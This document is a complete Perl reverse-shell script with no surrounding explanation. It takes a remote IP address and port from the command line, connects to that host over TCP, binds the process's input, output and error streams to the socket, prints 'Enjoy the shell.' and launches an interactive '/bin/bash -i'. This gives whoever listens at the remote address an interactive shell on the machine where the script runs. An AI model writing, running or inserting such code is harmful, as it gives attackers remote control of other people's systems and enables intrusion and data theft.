#!/usr/bin/perl -w   
#   
  
use strict;   
use Socket;   
use IO::Handle;   
  
if($#ARGV+1 != 2){   
       print "$#ARGV $0 Remote_IP Remote_Port \n";   
         exit 1;   
}   
  
my $remote_ip = $ARGV[0];   
my $remote_port = $ARGV[1];   
  
my $proto = getprotobyname("tcp");   
my $pack_addr = sockaddr_in($remote_port, inet_aton($remote_ip));   
  
my $shell = '/bin/bash -i';   
  
socket(SOCK, AF_INET, SOCK_STREAM, $proto);   
  
STDOUT->autoflush(1);   
SOCK->autoflush(1);   
  
connect(SOCK,$pack_addr) or die "can not connect:$!";   
  
open STDIN, "<&SOCK";   
open STDOUT, ">&SOCK";   
open STDERR, ">&SOCK";   
  
print "Enjoy the shell.\n";             
  
system($shell);   
close SOCK;   
  
exit 0;     

